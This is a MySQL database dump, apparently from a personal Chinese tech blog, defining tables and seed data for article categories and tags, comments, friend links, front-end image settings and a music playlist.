INSERT INTO `article_bind_article_category` VALUES (28, 28, 1);
INSERT INTO `article_bind_article_category` VALUES (29, 29, 1);
INSERT INTO `article_bind_article_category` VALUES (30, 30, 1);
INSERT INTO `article_bind_article_category` VALUES (31, 31, 1);
INSERT INTO `article_bind_article_category` VALUES (32, 32, 1);
INSERT INTO `article_bind_article_category` VALUES (33, 33, 1);
INSERT INTO `article_bind_article_category` VALUES (34, 34, 1);
INSERT INTO `article_bind_article_category` VALUES (35, 35, 3);
INSERT INTO `article_bind_article_category` VALUES (36, 36, 3);
INSERT INTO `article_bind_article_category` VALUES (37, 37, 2);
INSERT INTO `article_bind_article_category` VALUES (38, 38, 2);
INSERT INTO `article_bind_article_category` VALUES (39, 39, 2);
INSERT INTO `article_bind_article_category` VALUES (40, 40, 2);
INSERT INTO `article_bind_article_category` VALUES (41, 41, 2);
INSERT INTO `article_bind_article_category` VALUES (42, 42, 2);
INSERT INTO `article_bind_article_category` VALUES (43, 43, 2);
INSERT INTO `article_bind_article_category` VALUES (44, 44, 2);
INSERT INTO `article_bind_article_category` VALUES (45, 45, 2);
INSERT INTO `article_bind_article_category` VALUES (46, 46, 2);
INSERT INTO `article_bind_article_category` VALUES (47, 47, 2);
INSERT INTO `article_bind_article_category` VALUES (48, 48, 2);
INSERT INTO `article_bind_article_category` VALUES (49, 49, 2);
INSERT INTO `article_bind_article_category` VALUES (50, 50, 2);
INSERT INTO `article_bind_article_category` VALUES (51, 51, 2);
INSERT INTO `article_bind_article_category` VALUES (52, 52, 2);
INSERT INTO `article_bind_article_category` VALUES (53, 53, 2);
INSERT INTO `article_bind_article_category` VALUES (54, 54, 2);
INSERT INTO `article_bind_article_category` VALUES (55, 55, 2);
INSERT INTO `article_bind_article_category` VALUES (56, 56, 2);
INSERT INTO `article_bind_article_category` VALUES (57, 57, 2);
INSERT INTO `article_bind_article_category` VALUES (58, 58, 1);
INSERT INTO `article_bind_article_category` VALUES (59, 59, 1);
INSERT INTO `article_bind_article_category` VALUES (60, 60, 1);
INSERT INTO `article_bind_article_category` VALUES (61, 61, 1);
INSERT INTO `article_bind_article_category` VALUES (62, 62, 1);
INSERT INTO `article_bind_article_category` VALUES (63, 63, 1);
INSERT INTO `article_bind_article_category` VALUES (64, 64, 1);
INSERT INTO `article_bind_article_category` VALUES (65, 65, 1);
INSERT INTO `article_bind_article_category` VALUES (66, 66, 1);
INSERT INTO `article_bind_article_category` VALUES (67, 67, 1);
INSERT INTO `article_bind_article_category` VALUES (68, 68, 1);
INSERT INTO `article_bind_article_category` VALUES (69, 69, 1);
INSERT INTO `article_bind_article_category` VALUES (70, 70, 1);
INSERT INTO `article_bind_article_category` VALUES (71, 71, 1);
INSERT INTO `article_bind_article_category` VALUES (72, 72, 1);
INSERT INTO `article_bind_article_category` VALUES (73, 73, 1);
INSERT INTO `article_bind_article_category` VALUES (74, 74, 1);
INSERT INTO `article_bind_article_category` VALUES (75, 75, 1);
INSERT INTO `article_bind_article_category` VALUES (76, 76, 1);
INSERT INTO `article_bind_article_category` VALUES (77, 77, 1);
INSERT INTO `article_bind_article_category` VALUES (78, 78, 1);
INSERT INTO `article_bind_article_category` VALUES (79, 79, 1);
INSERT INTO `article_bind_article_category` VALUES (80, 80, 3);
INSERT INTO `article_bind_article_category` VALUES (81, 81, 3);
INSERT INTO `article_bind_article_category` VALUES (82, 82, 3);
INSERT INTO `article_bind_article_category` VALUES (83, 83, 3);
INSERT INTO `article_bind_article_category` VALUES (84, 84, 3);
INSERT INTO `article_bind_article_category` VALUES (85, 85, 3);
INSERT INTO `article_bind_article_category` VALUES (86, 86, 3);
INSERT INTO `article_bind_article_category` VALUES (87, 87, 3);
INSERT INTO `article_bind_article_category` VALUES (88, 88, 3);
INSERT INTO `article_bind_article_category` VALUES (89, 89, 3);
INSERT INTO `article_bind_article_category` VALUES (90, 90, 3);
INSERT INTO `article_bind_article_category` VALUES (91, 91, 3);
INSERT INTO `article_bind_article_category` VALUES (92, 92, 3);
INSERT INTO `article_bind_article_category` VALUES (93, 93, 3);
INSERT INTO `article_bind_article_category` VALUES (94, 94, 3);
INSERT INTO `article_bind_article_category` VALUES (95, 95, 3);
INSERT INTO `article_bind_article_category` VALUES (96, 96, 3);
INSERT INTO `article_bind_article_category` VALUES (97, 97, 1);
INSERT INTO `article_bind_article_category` VALUES (98, 98, 1);
INSERT INTO `article_bind_article_category` VALUES (99, 99, 1);
INSERT INTO `article_bind_article_category` VALUES (100, 100, 1);
INSERT INTO `article_bind_article_category` VALUES (101, 101, 3);
INSERT INTO `article_bind_article_category` VALUES (102, 102, 3);
INSERT INTO `article_bind_article_category` VALUES (103, 103, 1);
INSERT INTO `article_bind_article_category` VALUES (104, 104, 1);
INSERT INTO `article_bind_article_category` VALUES (105, 105, 1);
INSERT INTO `article_bind_article_category` VALUES (106, 106, 1);
INSERT INTO `article_bind_article_category` VALUES (107, 107, 1);
INSERT INTO `article_bind_article_category` VALUES (108, 108, 1);
INSERT INTO `article_bind_article_category` VALUES (109, 109, 1);
INSERT INTO `article_bind_article_category` VALUES (110, 110, 1);
INSERT INTO `article_bind_article_category` VALUES (111, 111, 1);
INSERT INTO `article_bind_article_category` VALUES (112, 112, 1);
INSERT INTO `article_bind_article_category` VALUES (113, 113, 1);
INSERT INTO `article_bind_article_category` VALUES (114, 114, 1);
INSERT INTO `article_bind_article_category` VALUES (115, 115, 1);

-- ----------------------------
-- Table structure for article_bind_article_tag
-- ----------------------------
DROP TABLE IF EXISTS `article_bind_article_tag`;
CREATE TABLE `article_bind_article_tag`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '文章与文章标签绑定的id',
  `article_tag_id` int(0) NOT NULL COMMENT '文章标签的id',
  `article_id` int(0) NOT NULL COMMENT '文章的id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6463 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_bind_article_tag
-- ----------------------------
INSERT INTO `article_bind_article_tag` VALUES (1, 30, 1);
INSERT INTO `article_bind_article_tag` VALUES (2, 30, 2);
INSERT INTO `article_bind_article_tag` VALUES (3, 30, 3);
INSERT INTO `article_bind_article_tag` VALUES (4, 104, 4);
INSERT INTO `article_bind_article_tag` VALUES (5, 104, 5);
INSERT INTO `article_bind_article_tag` VALUES (6, 104, 6);
INSERT INTO `article_bind_article_tag` VALUES (7, 101, 7);
INSERT INTO `article_bind_article_tag` VALUES (8, 101, 8);
INSERT INTO `article_bind_article_tag` VALUES (9, 101, 9);
INSERT INTO `article_bind_article_tag` VALUES (10, 101, 10);
INSERT INTO `article_bind_article_tag` VALUES (11, 20, 11);
INSERT INTO `article_bind_article_tag` VALUES (12, 20, 12);
INSERT INTO `article_bind_article_tag` VALUES (13, 20, 13);
INSERT INTO `article_bind_article_tag` VALUES (14, 20, 14);
INSERT INTO `article_bind_article_tag` VALUES (15, 20, 15);
INSERT INTO `article_bind_article_tag` VALUES (16, 103, 16);
INSERT INTO `article_bind_article_tag` VALUES (17, 103, 17);
INSERT INTO `article_bind_article_tag` VALUES (18, 102, 18);
INSERT INTO `article_bind_article_tag` VALUES (19, 102, 19);
INSERT INTO `article_bind_article_tag` VALUES (20, 102, 20);
INSERT INTO `article_bind_article_tag` VALUES (21, 102, 21);
INSERT INTO `article_bind_article_tag` VALUES (22, 104, 22);
INSERT INTO `article_bind_article_tag` VALUES (23, 104, 23);
INSERT INTO `article_bind_article_tag` VALUES (24, 107, 24);
INSERT INTO `article_bind_article_tag` VALUES (25, 107, 25);
INSERT INTO `article_bind_article_tag` VALUES (26, 107, 26);
INSERT INTO `article_bind_article_tag` VALUES (27, 114, 27);
INSERT INTO `article_bind_article_tag` VALUES (28, 114, 28);
INSERT INTO `article_bind_article_tag` VALUES (29, 114, 29);
INSERT INTO `article_bind_article_tag` VALUES (30, 114, 30);
INSERT INTO `article_bind_article_tag` VALUES (31, 116, 31);
INSERT INTO `article_bind_article_tag` VALUES (32, 116, 32);
INSERT INTO `article_bind_article_tag` VALUES (33, 115, 33);
INSERT INTO `article_bind_article_tag` VALUES (34, 115, 34);
INSERT INTO `article_bind_article_tag` VALUES (35, 20, 35);
INSERT INTO `article_bind_article_tag` VALUES (36, 20, 36);
INSERT INTO `article_bind_article_tag` VALUES (37, 10, 37);
INSERT INTO `article_bind_article_tag` VALUES (38, 10, 38);
INSERT INTO `article_bind_article_tag` VALUES (39, 10, 39);
INSERT INTO `article_bind_article_tag` VALUES (40, 10, 40);
INSERT INTO `article_bind_article_tag` VALUES (41, 10, 41);
INSERT INTO `article_bind_article_tag` VALUES (42, 10, 42);
INSERT INTO `article_bind_article_tag` VALUES (43, 10, 43);
INSERT INTO `article_bind_article_tag` VALUES (44, 10, 44);
INSERT INTO `article_bind_article_tag` VALUES (45, 10, 45);
INSERT INTO `article_bind_article_tag` VALUES (46, 10, 46);
INSERT INTO `article_bind_article_tag` VALUES (47, 10, 47);
INSERT INTO `article_bind_article_tag` VALUES (48, 10, 48);
INSERT INTO `article_bind_article_tag` VALUES (49, 10, 49);
INSERT INTO `article_bind_article_tag` VALUES (50, 10, 50);
INSERT INTO `article_bind_article_tag` VALUES (51, 10, 51);
INSERT INTO `article_bind_article_tag` VALUES (52, 10, 52);
INSERT INTO `article_bind_article_tag` VALUES (53, 10, 53);
INSERT INTO `article_bind_article_tag` VALUES (54, 10, 54);
INSERT INTO `article_bind_article_tag` VALUES (55, 10, 55);
INSERT INTO `article_bind_article_tag` VALUES (56, 10, 56);
INSERT INTO `article_bind_article_tag` VALUES (57, 10, 57);
INSERT INTO `article_bind_article_tag` VALUES (58, 113, 58);
INSERT INTO `article_bind_article_tag` VALUES (59, 113, 59);
INSERT INTO `article_bind_article_tag` VALUES (60, 113, 60);
INSERT INTO `article_bind_article_tag` VALUES (61, 113, 61);
INSERT INTO `article_bind_article_tag` VALUES (62, 113, 62);
INSERT INTO `article_bind_article_tag` VALUES (63, 113, 63);
INSERT INTO `article_bind_article_tag` VALUES (64, 113, 64);
INSERT INTO `article_bind_article_tag` VALUES (65, 113, 65);
INSERT INTO `article_bind_article_tag` VALUES (66, 113, 66);
INSERT INTO `article_bind_article_tag` VALUES (67, 106, 67);
INSERT INTO `article_bind_article_tag` VALUES (68, 106, 68);
INSERT INTO `article_bind_article_tag` VALUES (69, 105, 69);
INSERT INTO `article_bind_article_tag` VALUES (70, 105, 70);
INSERT INTO `article_bind_article_tag` VALUES (71, 105, 71);
INSERT INTO `article_bind_article_tag` VALUES (72, 105, 72);
INSERT INTO `article_bind_article_tag` VALUES (73, 105, 73);
INSERT INTO `article_bind_article_tag` VALUES (74, 108, 74);
INSERT INTO `article_bind_article_tag` VALUES (75, 108, 75);
INSERT INTO `article_bind_article_tag` VALUES (76, 108, 76);
INSERT INTO `article_bind_article_tag` VALUES (77, 108, 77);
INSERT INTO `article_bind_article_tag` VALUES (78, 108, 78);
INSERT INTO `article_bind_article_tag` VALUES (79, 108, 79);
INSERT INTO `article_bind_article_tag` VALUES (80, 110, 80);
INSERT INTO `article_bind_article_tag` VALUES (81, 110, 81);
INSERT INTO `article_bind_article_tag` VALUES (82, 110, 82);
INSERT INTO `article_bind_article_tag` VALUES (83, 110, 83);
INSERT INTO `article_bind_article_tag` VALUES (84, 110, 84);
INSERT INTO `article_bind_article_tag` VALUES (85, 110, 85);
INSERT INTO `article_bind_article_tag` VALUES (86, 110, 86);
INSERT INTO `article_bind_article_tag` VALUES (87, 110, 87);
INSERT INTO `article_bind_article_tag` VALUES (88, 110, 88);
INSERT INTO `article_bind_article_tag` VALUES (89, 110, 89);
INSERT INTO `article_bind_article_tag` VALUES (90, 110, 90);
INSERT INTO `article_bind_article_tag` VALUES (91, 110, 91);
INSERT INTO `article_bind_article_tag` VALUES (92, 110, 92);
INSERT INTO `article_bind_article_tag` VALUES (93, 110, 93);
INSERT INTO `article_bind_article_tag` VALUES (94, 109, 94);
INSERT INTO `article_bind_article_tag` VALUES (95, 109, 95);
INSERT INTO `article_bind_article_tag` VALUES (96, 109, 96);
INSERT INTO `article_bind_article_tag` VALUES (97, 109, 97);
INSERT INTO `article_bind_article_tag` VALUES (98, 111, 98);
INSERT INTO `article_bind_article_tag` VALUES (99, 111, 99);
INSERT INTO `article_bind_article_tag` VALUES (100, 111, 100);
INSERT INTO `article_bind_article_tag` VALUES (101, 20, 101);
INSERT INTO `article_bind_article_tag` VALUES (102, 20, 102);
INSERT INTO `article_bind_article_tag` VALUES (103, 111, 103);
INSERT INTO `article_bind_article_tag` VALUES (104, 111, 104);
INSERT INTO `article_bind_article_tag` VALUES (105, 111, 105);
INSERT INTO `article_bind_article_tag` VALUES (106, 111, 106);
INSERT INTO `article_bind_article_tag` VALUES (107, 111, 107);
INSERT INTO `article_bind_article_tag` VALUES (108, 112, 108);
INSERT INTO `article_bind_article_tag` VALUES (109, 112, 109);
INSERT INTO `article_bind_article_tag` VALUES (110, 112, 110);
INSERT INTO `article_bind_article_tag` VALUES (111, 112, 111);
INSERT INTO `article_bind_article_tag` VALUES (112, 112, 112);
INSERT INTO `article_bind_article_tag` VALUES (113, 112, 113);
INSERT INTO `article_bind_article_tag` VALUES (114, 112, 114);
INSERT INTO `article_bind_article_tag` VALUES (115, 112, 115);

-- ----------------------------
-- Table structure for article_category
-- ----------------------------
DROP TABLE IF EXISTS `article_category`;
CREATE TABLE `article_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '分类主键id',
  `name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '分类的名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '分类的描述',
  `article_sum` int(0) NOT NULL DEFAULT 0 COMMENT '该分类的文章数量,由消息队列更新',
  `comment_sum` int(0) NOT NULL DEFAULT 0 COMMENT '分类的评论数量,由定时任务进行更新',
  `parent_categoray_id` int(0) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '分类的数据表,描述分类的信息' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_category
-- ----------------------------
INSERT INTO `article_category` VALUES (1, '学习笔记', '学习笔记', 0, 0, 0);
INSERT INTO `article_category` VALUES (2, '搭建部署', '搭建部署', 0, 0, 0);
INSERT INTO `article_category` VALUES (3, '代码示例', '代码示例', 0, 0, 0);
INSERT INTO `article_category` VALUES (4, '生活闲谈', '生活闲谈', 0, 0, 0);

-- ----------------------------
-- Table structure for article_tag
-- ----------------------------
DROP TABLE IF EXISTS `article_tag`;
CREATE TABLE `article_tag`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章标签的名称',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '文章标签的描述',
  `article_sum` int(0) NOT NULL COMMENT '文章标签的文章数量',
  `comment_sum` int(0) NOT NULL COMMENT '文章标签的评论数量',
  `weight` int(0) NOT NULL COMMENT '文章标签的排序权重',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 24 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '文章标签表' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of article_tag
-- ----------------------------
INSERT INTO `article_tag` VALUES (10, '搭建部署', '搭建部署', 0, 0, 0);
INSERT INTO `article_tag` VALUES (20, '代码示例', '代码示例', 0, 0, 0);
INSERT INTO `article_tag` VALUES (30, '生活闲谈', '生活闲谈', 0, 0, 0);
INSERT INTO `article_tag` VALUES (101, 'java基础', 'java基础', 0, 0, 0);
INSERT INTO `article_tag` VALUES (102, 'nginx', 'nginx', 0, 0, 0);
INSERT INTO `article_tag` VALUES (103, 'tomcat', 'tomcat', 0, 0, 0);
INSERT INTO `article_tag` VALUES (104, '网络', '网络', 0, 0, 0);
INSERT INTO `article_tag` VALUES (105, 'netty', 'netty', 0, 0, 0);
INSERT INTO `article_tag` VALUES (106, '网络IO', '网络IO', 0, 0, 0);
INSERT INTO `article_tag` VALUES (107, '磁盘IO', '磁盘IO', 0, 0, 0);
INSERT INTO `article_tag` VALUES (108, '并发编程', '并发编程', 0, 0, 0);
INSERT INTO `article_tag` VALUES (109, 'juc', 'juc', 0, 0, 0);
INSERT INTO `article_tag` VALUES (110, '多线程设计模式', '多线程设计模式', 0, 0, 0);
INSERT INTO `article_tag` VALUES (111, 'jvm', 'jvm', 0, 0, 0);
INSERT INTO `article_tag` VALUES (112, 'mysql', 'mysql', 0, 0, 0);
INSERT INTO `article_tag` VALUES (113, '分布式', '分布式', 0, 0, 0);
INSERT INTO `article_tag` VALUES (114, 'redis', 'redis', 0, 0, 0);
INSERT INTO `article_tag` VALUES (115, 'elasticsearch', 'elasticsearch', 0, 0, 0);
INSERT INTO `article_tag` VALUES (116, 'zookeeper', 'zookeeper', 0, 0, 0);

-- ----------------------------
-- Table structure for article_tag_bind_article_category
-- ----------------------------
DROP TABLE IF EXISTS `article_tag_bind_article_category`;
CREATE TABLE `article_tag_bind_article_category`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT,
  `article_category_id` int(0) NOT NULL COMMENT '文章分类的id',
  `article_tag_id` int(0) NOT NULL COMMENT '文章标签的id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for comment
-- ----------------------------
DROP TABLE IF EXISTS `comment`;
CREATE TABLE `comment`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '评论主键id',
  `content` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '评论的内容,直接存放的文本,后续可以使用markdown',
  `user_id` int(0) NOT NULL COMMENT '评论用户id',
  `article_id` int(0) NOT NULL COMMENT '评论文章id',
  `parent_id` int(0) NOT NULL DEFAULT 0 COMMENT '父评论id,是否评论嵌套,评论哪个评论',
  `root_id` int(0) NOT NULL DEFAULT 0 COMMENT '根评论id,评论嵌套情况下',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建评论的时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新的评论时间',
  `approval` int(0) NOT NULL DEFAULT 0 COMMENT '评论的赞数',
  `oppose` int(0) NOT NULL DEFAULT 0 COMMENT '评论的踩数',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '评论的数据表,添加parent_id和root_id字段使其支持评论嵌套' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for friend
-- ----------------------------
DROP TABLE IF EXISTS `friend`;
CREATE TABLE `friend`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '友链主键id',
  `nickname` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '昵称',
  `website` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '网站',
  `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '头像',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '描述',
  `weight` int(0) NOT NULL DEFAULT 0 COMMENT '权重',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '添加时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 18 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of friend
-- ----------------------------
INSERT INTO `friend` VALUES (1, 'denua', 'http://dengzii.com', '', 'denua', 0, '2018-08-27 20:46:19', '2018-08-27 20:46:19');
INSERT INTO `friend` VALUES (2, '会打篮球的程序猿', 'http://www.lzhpo.com', 'http://cdn.liuzhaopo.top/tx.jpg', '我想带一人回云归不知处，带回去，藏起来', 0, '2018-10-23 21:09:55', '2018-10-23 21:09:55');
INSERT INTO `friend` VALUES (3, 'Bucai', 'http://blog.ncgame.cc/', 'http://q2.qlogo.cn/headimg_dl?bs=1450941858&dst_uin=1450941858&dst_uin=1450941858&;dst_uin=1450941858&spec=100&url_enc=0&referer=bu_interface&term_type=PC', '啥都不会', 0, '2018-11-27 19:13:16', '2018-11-27 19:13:16');
INSERT INTO `friend` VALUES (5, 'XH博客', 'http://wp.26hx.cn/', 'http://wp.26hx.cn/wp-content/uploads/2019/10/8HTM6XF2MMXEPIKXXF-e1571286864148.jpg', 'XHXH博客', 0, '2019-10-17 16:27:53', '2019-10-17 16:27:53');
INSERT INTO `friend` VALUES (6, '邓尘锋', 'http://surest.cn', 'https://avatars3.githubusercontent.com/u/29169847?s=460&v=4', '邓尘锋', 0, '2019-10-17 16:42:17', '2019-10-17 16:42:17');
INSERT INTO `friend` VALUES (8, 'IT玩客', 'https://www.91the.top', 'https://static.91the.top/logo.png', '记录工作生涯中直接回味的有趣技术', 0, '2019-10-27 04:16:58', '2019-10-27 04:16:58');
INSERT INTO `friend` VALUES (9, '东方幻梦', 'https://blog.badapple.pro/', '', '只是当时已惘然', 0, '2019-10-28 17:46:24', '2019-10-28 17:46:24');
INSERT INTO `friend` VALUES (10, '乐心湖', 'https://www.xn2001.com', 'https://cdn.xn2001.com/img/head.jpg', '生活很苦,但是你很甜.致我深爱的那个北方女子.', 0, '2019-10-28 17:47:05', '2019-10-28 17:47:05');
INSERT INTO `friend` VALUES (11, '椎咲良田', 'https://sanshiliuxiao.top', 'https://i.loli.net/2019/01/28/5c4eca46c1d0b.png', '椎咲良田的博客', 0, '2019-10-28 17:58:25', '2019-10-28 17:58:25');
INSERT INTO `friend` VALUES (12, '初雪', 'https://yuki.yuki233.com/', '', '初雪的无名blog', 0, '2019-10-28 18:07:08', '2019-10-28 18:07:08');
INSERT INTO `friend` VALUES (15, '洪卫の博客', 'https://sunhwee.com', 'https://sunhwee.com/hwsun.jpg', 'UESTC CVer！', 0, '2019-10-28 18:46:37', '2019-10-28 18:46:37');
INSERT INTO `friend` VALUES (17, '孤寂无情', 'https://gujiwuqing.top', 'https://img.gujiwuqing.top/avatar.jpg', '孤寂无情', 0, '2021-01-04 21:58:07', '2021-01-04 21:58:07');

-- ----------------------------
-- Table structure for front_img_config
-- ----------------------------
DROP TABLE IF EXISTS `front_img_config`;
CREATE TABLE `front_img_config`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '前台图片配置主键id',
  `belong` int(0) NOT NULL DEFAULT 0 COMMENT '属于的位置:1.分类页面,2.搜索页面,3,文章页面,4.用户页面,5.登录页面,6.个人logo,7.轮播页面',
  `desc` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '类型的描述',
  `img` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '图片的地址',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '创建的时间',
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0) COMMENT '更新的时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '前台页面配置表，方便更换背景图片等信息' ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of front_img_config
-- ----------------------------
INSERT INTO `front_img_config` VALUES (1, 1, '分类', 'http://blog.img.tuwq.cn/upload/config/img/8a19c94133bf1273cfd18f1da736626f.jpg?v=1533793520500', '2018-08-08 16:13:12', '2018-08-09 05:45:21');
INSERT INTO `front_img_config` VALUES (2, 2, '搜索', 'http://blog.img.tuwq.cn/upload/config/img/search.jpg?v=1533734944107', '2018-08-08 16:13:22', '2018-08-08 13:29:04');
INSERT INTO `front_img_config` VALUES (3, 3, '文章', 'http://blog.img.tuwq.cn/upload/config/img/文章壁纸.png?v=1624880237705', '2018-08-08 16:13:45', '2021-06-28 19:37:18');
INSERT INTO `front_img_config` VALUES (4, 4, '用户', 'http://blog.img.tuwq.cn/upload/config/img/s1.jpg?v=1533792086156', '2018-08-08 16:14:05', '2018-08-09 05:21:26');
INSERT INTO `front_img_config` VALUES (5, 5, '登录', 'http://blog.img.tuwq.cn/upload/config/img/login.jpg?v=1533734270104', '2018-08-08 17:15:58', '2018-08-08 13:17:50');
INSERT INTO `front_img_config` VALUES (6, 6, '个人logo', 'http://blog.img.tuwq.cn/upload/config/img/logo-transparent.png?v=1550760644501', '2018-08-08 18:15:24', '2018-11-15 15:39:45');
INSERT INTO `front_img_config` VALUES (7, 7, '轮播图1', 'http://blog.img.tuwq.cn/upload/config/img/98500b4b6c1a8a6738b4f2bf836a29c7.jpg?v=1533793915422', '2018-08-08 16:16:31', '2018-08-09 05:51:55');
INSERT INTO `front_img_config` VALUES (8, 7, '轮播图2', 'http://blog.img.tuwq.cn/upload/config/img/a693a08ebae745a8726b3dac591830e2.jpg?v=1533793959353', '2018-08-08 16:19:01', '2018-08-09 05:52:39');
INSERT INTO `front_img_config` VALUES (9, 7, '轮播图3', 'http://blog.img.tuwq.cn/upload/config/img/e89e63c82505b9b9316db45b961860b8.jpg?v=1533793831849', '2018-08-08 16:27:13', '2018-08-09 05:50:32');
INSERT INTO `front_img_config` VALUES (10, 8, '主背景', 'http://blog.img.tuwq.cn/upload/config/img/3D5801BEE028B5E138596C10B104200D.jpg?v=1550759101218', '2019-02-21 23:42:26', '2019-02-21 23:42:26');

-- ----------------------------
-- Table structure for song
-- ----------------------------
DROP TABLE IF EXISTS `song`;
CREATE TABLE `song`  (
  `id` int(0) UNSIGNED NOT NULL AUTO_INCREMENT COMMENT '歌曲主键',
  `song_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌名',
  `singer` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌手',
  `lyric` text CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '歌词',
  `cover` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌曲封面',
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '歌曲地址',
  `load_sum` int(0) NOT NULL DEFAULT 0 COMMENT '下载数量',
  `praise` int(0) NOT NULL DEFAULT 0 COMMENT '喜欢数',
  `weight` int(0) NOT NULL DEFAULT 0 COMMENT '权重',
  `duration` double(11, 0) NOT NULL DEFAULT 0 COMMENT '播放时间长度',
  `create_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  `update_time` datetime(0) NOT NULL DEFAULT CURRENT_TIMESTAMP(0),
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 164 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of song
-- ----------------------------
INSERT INTO `song` VALUES (4, 'なんでもないや 没什么大不了的（Cover：Radwimps）', 'Akie秋绘', '', 'FBE2BFB0EF19E43F34C280B6ACFC9BFA_179358614111.jpg', 'FBE2BFB0EF19E43F34C280B6ACFC9BFA_Akie秋绘 - なんでもないや 没什么大不了的（Cover：Radwimps）.mp3', 0, 0, 0, 347, '2018-08-24 11:17:50', '2018-08-24 11:17:50');
INSERT INTO `song` VALUES (5, '前前前世 (movie ver.),动画电影《你的名字。》主题曲,', 'RADWIMPS', '', '7AF750DB6D06820AD12EA8602298793A_764910471.jpg', '7AF750DB6D06820AD12EA8602298793A_RADWIMPS - 前前前世 (movie ver.).mp3', 0, 0, 0, 286, '2018-08-24 11:21:14', '2018-08-24 11:21:14');
INSERT INTO `song` VALUES (6, '深海少女', 'のぶなが', '', 'DBED9F237AFB8B81EC188785D0400F1D_-1665673591.jpg', 'DBED9F237AFB8B81EC188785D0400F1D_のぶなが - 深海少女.mp3', 0, 0, 0, 217, '2018-08-24 11:25:34', '2018-08-24 11:25:34');
INSERT INTO `song` VALUES (7, '夏恋', 'Otokaze', '', 'A7728690B1D88CCDC579D6A0ED0EA058_-930949409.jpg', 'A7728690B1D88CCDC579D6A0ED0EA058_Otokaze - 夏恋.mp3', 0, 0, 0, 266, '2018-08-24 11:28:51', '2018-08-24 11:28:51');
INSERT INTO `song` VALUES (8, 'MEGALOBOX', 'Mabanua', '', '999F7AA28DA05FA6EBFB777FB4EAD63B_1008361907.jpg', '999F7AA28DA05FA6EBFB777FB4EAD63B_Mabanua - MEGALOBOX.mp3', 0, 0, 0, 126, '2018-08-24 11:30:43', '2018-08-24 11:30:43');
INSERT INTO `song` VALUES (9, '雨き声残響', 'ゆめこ', '', 'E97DF72F5E43512BB1738D82C6E971F2_2112942494.jpg', 'E97DF72F5E43512BB1738D82C6E971F2_ゆめこ - 雨き声残響.mp3', 0, 0, 0, 173, '2018-08-24 11:32:49', '2018-08-24 11:32:49');
